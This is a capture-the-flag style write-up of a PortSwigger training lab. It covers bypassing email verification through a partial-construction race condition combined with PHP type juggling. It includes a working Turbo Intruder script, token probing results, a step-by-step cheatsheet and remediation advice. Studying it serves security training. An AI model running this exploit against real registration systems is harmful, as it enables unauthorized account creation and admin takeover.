---
title: "Partial Construction Race Conditions"
platform: "PortSwigger"
category: "Race Conditions"
difficulty: "Expert"
date: 2026-04-15
techniques: ["Partial Construction", "Token Bypass", "PHP Type Juggling"]
description: "Partial construction race in registration - `token[]=` matches NULL via PHP type juggling while the token is still being generated, bypassing email verification."
lang: en
translation_key: race-condition-partial-construction
---

## Platform
PortSwigger Web Security Academy

## Category
Race Conditions

## Difficulty
Expert

## Objective
Exploit a race condition in the user registration mechanism to bypass email verification, register with an arbitrary `@ginandjuice.shop` email address, log in, and delete user carlos.

---

## Context

The lab has a user registration system that requires email verification via a confirmation link with a token. A race condition exists in the partial construction of the user record, between when the user is created in the database and when the confirmation token is generated, the token field is temporarily null. By sending a confirmation request with an empty array token (`token[]=`) during this window, PHP's loose comparison matches the empty array against the null value, bypassing verification entirely.

---

## Reconnaissance

### Key Endpoints

| Endpoint | Method | Purpose |
|---|---|---|
| `/register` | POST | Register new user account |
| `/confirm` | POST | Confirm email with token |
| `/login` | POST | Login |
| `/admin` | GET | Admin panel |
| `/admin/delete?username=carlos` | GET | Delete user |
| `/resources/static/users.js` | GET | JavaScript for registration and confirmation forms |

### JavaScript Analysis
The file `/resources/static/users.js` revealed the confirmation flow:

```javascript
const confirmEmail = () => {
    const parts = window.location.href.split("?");
    const query = parts.length == 2 ? parts[1] : "";
    const action = query.includes('token') ? query : "";
    const form = document.createElement('form');
    form.method = 'POST';
    form.action = '/confirm?' + action;
    // ...
}
```

The confirmation endpoint accepts a token parameter via query string and submits it as a POST request.

### Token Behavior Testing

| Request | Response |
|---|---|
| `POST /confirm?token=1` | 400, "Incorrect token: 1" |
| `POST /confirm` (no token) | 400, "Missing parameter: token" |
| `POST /confirm?token=` (empty) | 403, "Forbidden" (patched!) |
| `POST /confirm?token[]=` (empty array) | 400, "Incorrect token: Array" |

The **403 Forbidden** response on empty token indicates developers patched the obvious bypass. However, `token[]=` (array) returns "Incorrect token: Array", meaning the server accepts and processes it. This is the attack vector.

### Race Window Analysis
The registration process internally follows these steps:
1. Create user record in database (token = null initially)
2. Generate confirmation token
3. Store token in database
4. Send confirmation email with token

Between steps 1 and 3, the token field is **null**. In PHP, `[] == null` evaluates to `true` due to loose comparison (type juggling). Sending `token[]=` during this window bypasses verification.

---

## Exploitation

### Vulnerable Flow (Partial Construction)
```
POST /register (user0):
  Step 1: INSERT user (token = NULL)  ←── RACE WINDOW
  Step 2: Generate token = "abc123"        ↑
  Step 3: UPDATE token = "abc123"     POST /confirm?token[]= arrives here
  Step 4: Send email                  PHP: [] == NULL → true → CONFIRMED!
```

### Attack Steps

1. **Analyzed JavaScript** at `/resources/static/users.js` to understand the confirmation flow
2. **Tested token parameter** variations to discover that `token[]=` (empty array) is processed by the server
3. **Identified partial construction window**, between user creation and token generation, the token is null
4. **Sent POST /register to Turbo Intruder** for automated parallel attacks
5. **Configured Turbo Intruder script** to send 20 registration attempts, each with 50 parallel confirmation requests:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1,
                          engine=Engine.BURP2)

    confirmReq = '''POST /confirm?token[]= HTTP/2
Host: 0a6300e10367d5998189843e002e002d.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

'''

    for attempt in range(20):
        username = 'user' + str(attempt)
        registerReq = target.req.replace('bruno1', username)
        engine.queue(registerReq, gate=str(attempt))
        for i in range(50):
            engine.queue(confirmReq, gate=str(attempt))
        engine.openGate(str(attempt))

def handleResponse(req, interesting):
    if 'User already exists' not in req.response and 'Incorrect token' not in req.response:
        table.add(req)
```

6. **Launched attack**, 20 attempts × 51 requests = 1,020 total requests
7. **Analyzed results**, responses with different Content-Length (2744 vs 2827) indicated successful confirmations
8. **Logged in** as `user1` with password `teste`, confirmed email `user1@ginandjuice.shop`
9. **Accessed Admin panel**, available due to `@ginandjuice.shop` email
10. **Deleted user carlos**, lab solved

### Result
- **Accounts confirmed via race condition:** 11 out of 20 (user1, user3, user4, user5, user6, user7, user9, user12, user13, user14, user17)
- **Success rate:** 55%
- **Admin access achieved** via `user1@ginandjuice.shop`
- **User carlos deleted**

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Initial Access | Valid Accounts | T1078 |
| Privilege Escalation | Exploitation for Privilege Escalation | T1068 |
| Defense Evasion | Exploitation for Defense Evasion | T1211 |

### CWE
- **CWE-362:** Concurrent Execution using Shared Resource with Improper Synchronization (Race Condition)
- **CWE-367:** Time-of-Check Time-of-Use (TOCTOU) Race Condition
- **CWE-1289:** Improper Validation of Unsafe Equivalence in Input

---

## Key Concepts Learned

| Concept | Description |
|---|---|
| Partial Construction | Exploiting the window between record creation and field population in the database |
| PHP Type Juggling | PHP loose comparison: `[] == null` evaluates to `true`, bypassing token validation |
| Token Array Bypass | Sending `token[]=` instead of `token=` to exploit type juggling against null values |
| High Volume Racing | Sending 50 confirmation requests per registration attempt to maximize race window hits |
| Response Length Analysis | Different Content-Length values in responses indicate different code paths (success vs failure) |

---

## Tools Used

| Tool | Purpose |
|---|---|
| Burp Suite Community | Proxy, HTTP History, Repeater |
| Turbo Intruder | Automated parallel requests with gate mechanism for precise timing |
| Firefox (Kali) | Browser with proxy configured to 127.0.0.1:8080 |

---

## Commands & Techniques Cheatsheet

```
# Partial Construction Race Condition Attack Flow
1. Analyze JavaScript for confirmation endpoint behavior
2. Test token parameter variations:
   - token=1         → "Incorrect token"
   - (no token)      → "Missing parameter"
   - token=          → "Forbidden" (patched)
   - token[]=        → "Incorrect token: Array" (processes it!)
3. Send POST /register to Turbo Intruder
4. Script: for each attempt, queue 1 register + 50 confirm requests on same gate
5. Use Engine.BURP2 for single-packet attack
6. Filter results: exclude "User already exists" and "Incorrect token"
7. Analyze response lengths for successful confirmations
8. Login with confirmed username + original password
```

---

## Remediation

To prevent partial construction race conditions:

- **Generate token before INSERT:** Create the confirmation token first, then insert the complete user record with the token already populated, no null window
- **Use strict comparison:** In PHP, use `===` instead of `==` to prevent type juggling (`[] === null` is `false`)
- **Validate token type:** Reject non-string token values server-side before comparison
- **Atomic record creation:** Use a database transaction that creates the user and token in a single atomic operation
- **Don't accept array parameters:** Sanitize input to reject array-type query parameters for scalar fields

---

## Reflection

This Expert-level lab combines two vulnerability classes: race conditions and PHP type juggling. The race window between user creation (token = null) and token generation is extremely small, requiring 50 parallel confirmation requests per attempt to reliably hit it. The key insight was discovering that `token[]=` bypasses the developer's patch on empty tokens, while they blocked `token=` with a 403, they didn't account for PHP's loose comparison treating an empty array as equal to null. The 55% success rate (11/20 attempts) shows that with enough parallel requests, even tiny race windows become reliably exploitable. This is the most sophisticated race condition attack in the series, combining timing exploitation with language-specific type system weaknesses.
